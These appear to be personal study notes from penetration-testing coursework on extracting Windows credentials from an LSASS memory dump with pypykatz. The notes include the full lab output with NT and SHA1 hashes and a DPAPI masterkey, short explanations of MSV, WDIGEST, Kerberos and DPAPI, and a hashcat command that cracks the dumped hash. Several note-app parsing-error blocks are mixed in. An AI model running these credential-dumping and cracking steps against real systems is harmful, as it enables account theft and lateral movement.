# Pypykatz

* python implementation of Mimikatz
* Once we have the dump file on our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to attempt to extract credentials from the .dmp file

**Running Pypykatz**

```shell-session
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

```shell-session
INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

**MSV**

* [MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.

**WDIGEST**

```shell-session
== WDIGEST [14ab89]==
	username bob
	domainname DESKTOP-33E7O54
	password None
	password (hex)
```

```
Dataview (inline field '= WDIGEST [14ab89]==
	username bob
	domainname DESKTOP-33E7O54
	password None
	password (hex)'): Error: 
-- PARSING FAILED --------------------------------------------------

> 1 | = WDIGEST [14ab89]==
    | ^
  2 | 	username bob
  3 | 	domainname DESKTOP-33E7O54

Expected one of the following: 

'(', 'null', boolean, date, duration, file link, list ('[1, 2, 3]'), negated field, number, object ('{ a: 1, b: 2 }'), string, variable
```

* LSASS caches credentials used by WDIGEST in clear-text.
* Modern Windows operating systems have WDIGEST disabled by default
* &#x20;Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST.
  * We can study the details of that security update [here](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

**Kerberos**

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

```
Dataview (inline field '= Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54'): Error: 
-- PARSING FAILED --------------------------------------------------

> 1 | = Kerberos ==
    | ^
  2 | 		Username: bob
  3 | 		Domain: DESKTOP-33E7O54

Expected one of the following: 

'(', 'null', boolean, date, duration, file link, list ('[1, 2, 3]'), negated field, number, object ('{ a: 1, b: 2 }'), string, variable
```

* Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments.
  * Domain user accounts are granted tickets upon authentication with Active Directory.
    * This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time.
* LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos.
  * It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

**DPAPI**

```shell-session
== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

```
Dataview (inline field '= DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605'): Error: 
-- PARSING FAILED --------------------------------------------------

> 1 | = DPAPI [14ab89]==
    | ^
  2 | 		luid 1354633
  3 | 		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b

Expected one of the following: 

'(', 'null', boolean, date, duration, file link, list ('[1, 2, 3]'), negated field, number, object ('{ a: 1, b: 2 }'), string, variable
```

* The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.

| Applications                | Use of DPAPI                                                                                |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
| `Outlook`                   | Passwords for email accounts.                                                               |
| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |

**Cracking the NT Hash with Hashcat**

*   #### Cracking the NT Hash with Hashcat

    ```
    sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
    ```
